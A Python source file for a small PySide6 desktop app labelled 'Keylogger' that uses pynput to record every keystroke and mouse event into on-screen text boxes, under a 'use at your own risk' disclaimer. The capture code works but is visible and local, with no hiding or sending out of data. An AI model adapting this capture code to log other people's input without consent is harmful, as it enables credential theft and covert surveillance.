# USE AT YOUR OWN RISK
# WITH GREAT POWER COMES GREAT RESPONSIBILITY
# I AM NOT RESPONSIBLE FOR WHAT YOU DO WITH THIS
""" Created by: AK1R4S4T0H
"""
import sys
from PySide6.QtWidgets import QApplication, QMainWindow, QTextEdit, QPushButton, QVBoxLayout, QWidget
from pynput import keyboard, mouse

class KeyloggerGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Keylogger")
        self.setGeometry(100, 100, 600, 600)

        self.textbox = QTextEdit(self)
        self.textbox.setReadOnly(True)
        self.textbox.setGeometry(50, 50, 500, 200)

        self.start_button = QPushButton("Start Keylogger", self)
        self.start_button.setGeometry(50, 300, 150, 30)
        self.start_button.clicked.connect(self.start_keylogger)

        self.stop_button = QPushButton("Stop Keylogger", self)
        self.stop_button.setGeometry(250, 300, 150, 30)
        self.stop_button.clicked.connect(self.stop_keylogger)

        self.textbox2 = QTextEdit(self)
        self.textbox2.setReadOnly(True)
        self.textbox2.setGeometry(50, 350, 500, 200)

        self.listener = None
        self.listener2= None

    def on_press(self, key):
        char = None
        try:
            char = key.char
        except AttributeError:
            if key == keyboard.Key.space:
                char = "[SPACE]"
            elif key == keyboard.Key.enter:
                char = "[ENTER]"
            else:
                char = f" [{key}] "

        if char:
            self.textbox.insertPlainText(char)

    def on_move(self, x, y):
        self.textbox2.insertPlainText(f"Mouse moved to ({x}, {y})\n")

    def on_drag(self, x, y, dx, dy):
        self.textbox2.insertPlainText(f"Mouse dragged by ({dx}, {dy})\n")

    def on_click(self, x, y, button, pressed):
        if pressed:
            self.textbox2.insertPlainText(f"Mouse clicked at ({x}, {y}) with {button.name}\n")

    def on_scroll(self, x, y, dx, dy):
        if dy > 0:
            self.textbox2.insertPlainText("Mouse scrolled up\n")
        elif dy < 0:
            self.textbox2.insertPlainText("Mouse scrolled down\n")

    def start_keylogger(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        self.listener2 = mouse.Listener(on_move=self.on_move, on_click=self.on_click, on_scroll=self.on_scroll, on_drag=self.on_drag)
        self.listener2.start()
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)

    def stop_keylogger(self):
        if self.listener:
            self.listener.stop()
            self.listener2.stop()

        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    keylogger_gui = KeyloggerGUI()
    keylogger_gui.show()
    sys.exit(app.exec())
